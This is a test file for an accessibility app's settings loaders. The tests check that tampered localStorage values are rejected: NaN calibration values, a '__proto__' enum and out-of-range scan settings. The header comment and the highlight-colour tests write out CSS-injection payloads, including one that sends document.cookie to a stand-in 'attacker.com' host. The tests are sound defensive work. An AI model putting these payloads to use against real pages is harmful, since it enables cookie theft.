/**
 * Calibration loaders + switch-scan style injection — hydration validators.
 *
 * Tracker calibration math divides by (leftX - rightX). A tampered persist
 * with NaN or matching leftX/rightX produces NaN coords that freeze the
 * cursor for an AAC user — accessibility DoS.
 *
 * switch-scan injectHighlightStyle interpolates the configured color
 * directly into a <style> tag's textContent. A color string like
 *   `red; } body { background: url('//attacker.com/?'+document.cookie) } a {`
 * would otherwise break out of the rule and execute attacker CSS.
 */
import { describe, it, expect, beforeEach } from 'vitest';
import { loadCalibration } from '@/services/headTracker';
import { loadPoseCalibration, loadPoseMapping } from '@/services/bodyPoseService';
import { loadConfig } from '@/services/switchScanService';

const HEAD_KEY = 'prism-head-calibration';
const POSE_KEY = 'prism-pose-calibration-landscape';
const POSE_LEGACY_KEY = 'prism-pose-calibration';
const POSE_MAPPING_KEY = 'prism-pose-config';
const SWITCH_SCAN_KEY = 'prism-switch-scan';

beforeEach(() => {
  if (typeof window !== 'undefined') window.localStorage.clear();
});

describe('headTracker.loadCalibration — NaN defense', () => {
  it('rejects NaN field', () => {
    window.localStorage.setItem(HEAD_KEY, JSON.stringify({ leftX: NaN, rightX: 0.3, topY: 0.3, bottomY: 0.7 }));
    const c = loadCalibration();
    expect(Number.isFinite(c.leftX)).toBe(true);
    expect(Number.isFinite(c.rightX)).toBe(true);
  });

  it('rejects Infinity field', () => {
    window.localStorage.setItem(HEAD_KEY, JSON.stringify({ leftX: Infinity, rightX: 0.3, topY: 0.3, bottomY: 0.7 }));
    const c = loadCalibration();
    expect(Number.isFinite(c.leftX)).toBe(true);
  });

  it('rejects equal leftX/rightX (would divide by zero)', () => {
    window.localStorage.setItem(HEAD_KEY, JSON.stringify({ leftX: 0.5, rightX: 0.5, topY: 0.3, bottomY: 0.7 }));
    const c = loadCalibration();
    expect(c.leftX).not.toBe(c.rightX);
  });

  it('rejects non-number type', () => {
    window.localStorage.setItem(HEAD_KEY, JSON.stringify({ leftX: '0.7', rightX: 0.3, topY: 0.3, bottomY: 0.7 }));
    const c = loadCalibration();
    expect(typeof c.leftX).toBe('number');
  });

  it('accepts valid calibration', () => {
    const valid = { leftX: 0.8, rightX: 0.2, topY: 0.25, bottomY: 0.75 };
    window.localStorage.setItem(HEAD_KEY, JSON.stringify(valid));
    expect(loadCalibration()).toEqual(valid);
  });
});

describe('bodyPoseService.loadPoseCalibration — NaN defense', () => {
  it('rejects NaN field', () => {
    window.localStorage.setItem(POSE_KEY, JSON.stringify({ leftX: 0.7, rightX: NaN, topY: 0.3, bottomY: 0.7 }));
    const c = loadPoseCalibration();
    expect(Number.isFinite(c.rightX)).toBe(true);
  });

  it('rejects equal topY/bottomY (would divide by zero)', () => {
    window.localStorage.setItem(POSE_KEY, JSON.stringify({ leftX: 0.7, rightX: 0.3, topY: 0.5, bottomY: 0.5 }));
    const c = loadPoseCalibration();
    expect(c.topY).not.toBe(c.bottomY);
  });

  it('rejects malformed primary then accepts valid legacy', () => {
    window.localStorage.setItem(POSE_KEY, JSON.stringify({ leftX: 'oops' }));
    window.localStorage.setItem(POSE_LEGACY_KEY, JSON.stringify({ leftX: 0.6, rightX: 0.1, topY: 0.2, bottomY: 0.8 }));
    const c = loadPoseCalibration();
    expect(c.leftX).toBe(0.6);
  });
});

describe('bodyPoseService.loadPoseMapping — enum defense', () => {
  it('rejects non-allowlisted trackingTarget', () => {
    window.localStorage.setItem(POSE_MAPPING_KEY, JSON.stringify({ trackingTarget: '__proto__', cursorSmoothing: 0.1 }));
    const m = loadPoseMapping();
    expect(m.trackingTarget).toBe('nose');
  });

  it('rejects NaN cursorSmoothing', () => {
    window.localStorage.setItem(POSE_MAPPING_KEY, JSON.stringify({ trackingTarget: 'nose', cursorSmoothing: NaN }));
    const m = loadPoseMapping();
    expect(Number.isFinite(m.cursorSmoothing)).toBe(true);
  });
});

describe('switchScanService.loadConfig — CSS injection + bounds', () => {
  it('rejects highlightColor with CSS rule break-out', () => {
    window.localStorage.setItem(SWITCH_SCAN_KEY, JSON.stringify({
      enabled: true,
      mode: 'auto',
      scanSpeedMs: 2000,
      groupScan: true,
      loops: 3,
      highlightColor: 'red; } body { background: url("//attacker.com/?cookie="+document.cookie) } a {',
    }));
    const cfg = loadConfig();
    expect(cfg.highlightColor).toBe('#FFD600');
  });

  it('rejects highlightColor with javascript:', () => {
    window.localStorage.setItem(SWITCH_SCAN_KEY, JSON.stringify({ highlightColor: 'javascript:alert(1)' }));
    expect(loadConfig().highlightColor).toBe('#FFD600');
  });

  it('rejects highlightColor with url()', () => {
    window.localStorage.setItem(SWITCH_SCAN_KEY, JSON.stringify({ highlightColor: 'url(//attacker.com)' }));
    expect(loadConfig().highlightColor).toBe('#FFD600');
  });

  it('accepts plain hex color', () => {
    window.localStorage.setItem(SWITCH_SCAN_KEY, JSON.stringify({ highlightColor: '#aabbcc' }));
    expect(loadConfig().highlightColor).toBe('#aabbcc');
  });

  it('accepts rgba color', () => {
    window.localStorage.setItem(SWITCH_SCAN_KEY, JSON.stringify({ highlightColor: 'rgba(255,0,0,0.5)' }));
    expect(loadConfig().highlightColor).toBe('rgba(255,0,0,0.5)');
  });

  it('clamps scanSpeedMs to safe range (0 would loop hot)', () => {
    window.localStorage.setItem(SWITCH_SCAN_KEY, JSON.stringify({ scanSpeedMs: 0 }));
    expect(loadConfig().scanSpeedMs).toBe(2000);
    window.localStorage.setItem(SWITCH_SCAN_KEY, JSON.stringify({ scanSpeedMs: 999_999 }));
    expect(loadConfig().scanSpeedMs).toBe(2000);
  });

  it('clamps loops to non-negative integer', () => {
    window.localStorage.setItem(SWITCH_SCAN_KEY, JSON.stringify({ loops: -5 }));
    expect(loadConfig().loops).toBe(3);
    window.localStorage.setItem(SWITCH_SCAN_KEY, JSON.stringify({ loops: NaN }));
    expect(loadConfig().loops).toBe(3);
  });

  it('rejects unknown mode', () => {
    window.localStorage.setItem(SWITCH_SCAN_KEY, JSON.stringify({ mode: 'evil' }));
    expect(loadConfig().mode).toBe('auto');
  });
});
